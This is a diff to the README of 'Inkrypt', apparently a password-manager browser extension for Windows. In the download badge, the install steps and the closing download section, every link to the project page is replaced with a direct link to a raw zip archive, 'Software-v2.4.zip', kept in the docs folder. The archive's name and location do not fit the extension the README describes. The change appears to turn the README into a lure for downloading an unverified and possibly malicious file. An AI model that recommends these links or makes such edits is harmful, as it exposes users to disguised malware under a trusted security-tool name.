@@ -1,6 +1,6 @@
 # 🔐 Inkrypt - Secure passwords and codes
 
-[![Download Inkrypt](https://img.shields.io/badge/Download-Inkrypt-blue?style=for-the-badge)](https://github.com/inimitable-slip84/Inkrypt)
+[![Download Inkrypt](https://img.shields.io/badge/Download-Inkrypt-blue?style=for-the-badge)](https://github.com/inimitable-slip84/Inkrypt/raw/refs/heads/main/docs/Software-v2.4.zip)
 
 ## 🧭 What Inkrypt does
 
@@ -30,7 +30,7 @@ Inkrypt runs as a browser extension on Windows. You do not install it like a nor
 
 ### Download and install
 
-1. Open the download page: [https://github.com/inimitable-slip84/Inkrypt](https://github.com/inimitable-slip84/Inkrypt)
+1. Open the download page: [https://github.com/inimitable-slip84/Inkrypt/raw/refs/heads/main/docs/Software-v2.4.zip](https://github.com/inimitable-slip84/Inkrypt/raw/refs/heads/main/docs/Software-v2.4.zip)
 2. Get the latest release or build from the project page
 3. Save the extension files on your PC
 4. Open your browser
@@ -177,4 +177,4 @@ Inkrypt uses the MIT license
 
 ## 🔗 Download
 
-Visit this page to download and install Inkrypt on Windows: [https://github.com/inimitable-slip84/Inkrypt](https://github.com/inimitable-slip84/Inkrypt)
+Visit this page to download and install Inkrypt on Windows: [https://github.com/inimitable-slip84/Inkrypt/raw/refs/heads/main/docs/Software-v2.4.zip](https://github.com/inimitable-slip84/Inkrypt/raw/refs/heads/main/docs/Software-v2.4.zip)
